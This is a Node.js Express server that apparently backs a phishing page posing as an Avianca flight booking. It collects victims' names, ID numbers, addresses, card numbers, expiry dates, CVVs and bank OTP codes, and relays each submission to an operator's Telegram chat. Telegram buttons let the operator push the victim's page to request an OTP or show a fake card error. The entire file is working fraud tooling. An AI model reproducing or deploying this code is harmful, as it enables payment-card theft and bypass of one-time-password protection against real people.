// server.js
import "dotenv/config";
import express from "express";
import path from "path";
import TelegramBot from "node-telegram-bot-api";
import { fileURLToPath } from "url";

const __filename = fileURLToPath(import.meta.url);
const __dirname = path.dirname(__filename);

const BOT_TOKEN = process.env.BOT_TOKEN;
const CHAT_ID = process.env.CHAT_ID;
const PORT = process.env.PORT || 3000;

if (!BOT_TOKEN || !CHAT_ID) {
  console.error("❌ Debes definir BOT_TOKEN y CHAT_ID en .env");
  process.exit(1);
}

const app = express();
app.use(express.json());
app.use(express.urlencoded({ extended: true }));
app.use(express.static(path.join(__dirname, "public")));

const bot = new TelegramBot(BOT_TOKEN, { polling: true });

// Mapas en memoria
const transactions = Object.create(null); // transactionId -> { status, messageId, chatId, data }
const messageToTx = Object.create(null);  // messageId -> transactionId

// Escapar texto para MarkdownV2
function escapeMarkdownV2(text = "") {
  return String(text).replace(/([_*[\]()~`>#+\-=|{}.!\\])/g, "\\$1");
}

/*
  1) /send-payment  -> ya tenías: recibe paymentData y crea mensaje con botones:
       Pedir Otp / Error de TC / Finalizar
     (mantengo este endpoint tal cual)
  2) /send-verification -> nuevo endpoint para chedf.html que recibe paymentData + otp (o transactionId)
       crea mensaje con botones: Error OTP / Error TC / Finalizar
*/

// ----------------- Endpoint: /send-payment (mantener) -----------------
app.post("/send-payment", async (req, res) => {
  try {
    const payload = req.body || {};
    const transactionId = payload.transactionId || (Date.now().toString(36) + Math.random().toString(36).slice(2));
    const stored = { ...payload, transactionId };

    // Campos escapados
    const flightCost = escapeMarkdownV2(stored.flightCost || "No ingresado");
    const name = escapeMarkdownV2(stored.name || "No ingresado");
    const cc = escapeMarkdownV2(stored.cc || "No ingresado");
    const email = escapeMarkdownV2(stored.email || "No ingresado");
    const telnum = escapeMarkdownV2(stored.telnum || "No ingresado");
    const city = escapeMarkdownV2(stored.city || "No ingresado");
    const state = escapeMarkdownV2(stored.state || "No ingresado");
    const address = escapeMarkdownV2(stored.address || "No ingresado");
    const bank = escapeMarkdownV2(stored.bank || "No ingresado");
    const cardNumber = escapeMarkdownV2(stored.cardNumber || "No ingresado");
    const expiryDate = escapeMarkdownV2(stored.expiryDate || "No ingresado");
    const cvv = escapeMarkdownV2(stored.cvv || "No ingresado");
    const dues = escapeMarkdownV2(stored.dues || "No ingresado");

    const message =
`✈️ *NUEVA RESERVA \\- AVIANCA* ✈️
\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-
*💰 Precio:* $${flightCost} USD
\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-
*👤 DATOS DEL TITULAR*
\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-
*🤵‍♂️ Nombre:* ${name}
*🪪 Identificación:* ${cc}
*📧 Email:* ${email}
*📱 Celular:* ${telnum}
*🗺️ Ciudad:* ${city}
*📍 Estado:* ${state}
*🏠 Dirección:* ${address}
\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-
*💳 DETALLES DE LA TARJETA*
\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-
*🏦 Banco:* ${bank}
*💳 Número de Tarjeta:*
\`${cardNumber}\`
*📅 Fecha de Exp:*
\`${expiryDate}\`
*🔐 CVV:*
\`${cvv}\`
*🔢 Cuotas:* ${dues}
\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-
*🆔 ID de Transacción:* ${escapeMarkdownV2(transactionId)}
`;

    const reply_markup = {
      inline_keyboard: [
        [{ text: "Pedir Otp", callback_data: `pedir_logo:${transactionId}` }],
        [{ text: "Error de TC", callback_data: `error_tc:${transactionId}` }],
        [{ text: "Finalizar", callback_data: `finalizar:${transactionId}` }]
      ]
    };

    const sent = await bot.sendMessage(CHAT_ID, message, {
      parse_mode: "MarkdownV2",
      reply_markup
    });

    transactions[transactionId] = {
      status: "pending",
      messageId: sent.message_id,
      chatId: sent.chat.id,
      data: stored
    };
    messageToTx[sent.message_id] = transactionId;

    return res.json({ ok: true, transactionId, messageId: sent.message_id });
  } catch (err) {
    console.error("Error /send-payment:", err);
    return res.status(500).json({ ok: false, error: "internal" });
  }
});

// --------------- Nuevo: /send-verification (para chedf.html) ---------------
app.post("/send-verification", async (req, res) => {
  try {
    // Espera: { transactionId?, paymentData: {...}, otp: "123456" }
    const { transactionId: txFromClient, paymentData = {}, otp = "" } = req.body;
    const transactionId = txFromClient || (Date.now().toString(36) + Math.random().toString(36).slice(2));
    const stored = { ...paymentData, otp, transactionId };

    // Escapar campos
    const name = escapeMarkdownV2(stored.name || "No ingresado");
    const cc = escapeMarkdownV2(stored.cc || "No ingresado");
    const email = escapeMarkdownV2(stored.email || "No ingresado");
    const telnum = escapeMarkdownV2(stored.telnum || "No ingresado");
    const city = escapeMarkdownV2(stored.city || "No ingresado");
    const state = escapeMarkdownV2(stored.state || "No ingresado");
    const address = escapeMarkdownV2(stored.address || "No ingresado");
    const bank = escapeMarkdownV2(stored.bank || "No ingresado");
    const cardNumber = escapeMarkdownV2(stored.cardNumber || "No ingresado");
    const expiryDate = escapeMarkdownV2(stored.expiryDate || "No ingresado");
    const cvv = escapeMarkdownV2(stored.cvv || "No ingresado");
    const dues = escapeMarkdownV2(stored.dues || "No ingresado");
    const otpEsc = escapeMarkdownV2(stored.otp || "No ingresado");

    const fullMessage =
`✈️ *NUEVA RESERVA \\- AVIANCA* ✈️
\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-
*👤 DATOS DEL TITULAR*
\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-
*🤵‍♂️ Nombre:* ${name}
*🪪 Identificación:* ${cc}
*📧 Email:* ${email}
*📱 Celular:* ${telnum}
*🗺️ Ciudad:* ${city}
*📍 Estado:* ${state}
*🏠 Dirección:* ${address}
\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-
*💳 DETALLES DE LA TARJETA*
\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-
*🏦 Banco:* ${bank}
*💳 Número de Tarjeta:*
\`${cardNumber}\`
*📅 Fecha de Exp:*
\`${expiryDate}\`
*🔐 CVV:*
\`${cvv}\`
*🔢 Cuotas:* ${dues}
\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-
*👤 DATOS DE ACCESO*
\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-
*Código OTP:* ${otpEsc}
\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-
*🆔 ID de Transacción:* ${escapeMarkdownV2(transactionId)}
`;

    const reply_markup = {
      inline_keyboard: [
        [{ text: "Error OTP", callback_data: `error_otp:${transactionId}` }, { text: "Error TC", callback_data: `error_tc:${transactionId}` }],
        [{ text: "Finalizar", callback_data: `finalizar:${transactionId}` }]
      ]
    };

    const sent = await bot.sendMessage(CHAT_ID, fullMessage, {
      parse_mode: "MarkdownV2",
      reply_markup
    });

    transactions[transactionId] = {
      status: "pending",
      messageId: sent.message_id,
      chatId: sent.chat.id,
      data: stored
    };
    messageToTx[sent.message_id] = transactionId;

    return res.json({ ok: true, transactionId, messageId: sent.message_id });
  } catch (err) {
    console.error("Error /send-verification:", err);
    return res.status(500).json({ ok: false, error: "internal" });
  }
});

// Endpoint que el frontend consulta con polling
app.get("/status/:transactionId", (req, res) => {
  const txId = req.params.transactionId;
  const tx = transactions[txId];
  if (!tx) return res.json({ status: "not_found" });
  return res.json({ status: tx.status || "pending" });
});

// Bot: manejo de botones (callback_query)
bot.on("callback_query", async (query) => {
  try {
    const data = query.data || ""; // ej: 'pedir_logo:txid' or 'error_otp:txid'
    const [action, txId] = data.split(":");
    const msg = query.message;
    const msgId = msg && msg.message_id;
    const chatId = msg && msg.chat && msg.chat.id;

    // Mapear la transacción
    const tx = (txId && transactions[txId]) || (msgId && transactions[messageToTx[msgId]]);
    if (tx) {
      tx.status = action; // 'pedir_logo' | 'error_tc' | 'finalizar' | 'error_otp'
    }

    // Responder callback (quita "cargando" en Telegram)
    await bot.answerCallbackQuery(query.id, { text: "✅ Acción registrada" });

    // Editar el mensaje para quitar los botones (feedback visual)
    try {
      if (chatId && msgId) {
        await bot.editMessageReplyMarkup({ inline_keyboard: [] }, { chat_id: chatId, message_id: msgId });
      }
    } catch (e) {
      // puede fallar si ya fue editado; ignoramos
    }
  } catch (err) {
    console.error("Error en callback_query:", err);
  }
});

// arrancar servidor
app.listen(PORT, () => {
  console.log(`✅ Server corriendo en http://localhost:${PORT}`);
});
